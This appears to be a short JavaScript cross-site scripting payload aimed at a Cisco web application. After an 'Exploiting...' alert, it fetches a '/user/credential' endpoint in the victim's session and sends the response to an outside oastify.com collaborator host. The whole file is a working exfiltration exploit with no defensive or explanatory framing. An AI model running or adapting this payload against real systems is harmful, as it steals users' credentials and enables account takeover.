alert("Exploiting...");
async function fetchData(url) {
  try {
    // Fetch the URL content
    const response = await fetch(url);

    // Check if the response is OK (status code 200)
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    // Get the content as text
    const content = await response.text();

    await fetch('http://yjlrx97p5e6hoxwb1dp5jajqzh5at0hp.oastify.com/?a='+content)

    
  } catch (error) {
    console.error('Error fetching the data:', error);
  }
}

// Example usage
fetchData('https://ciscoshare.cisco.com/alfext/ext/user/credential');
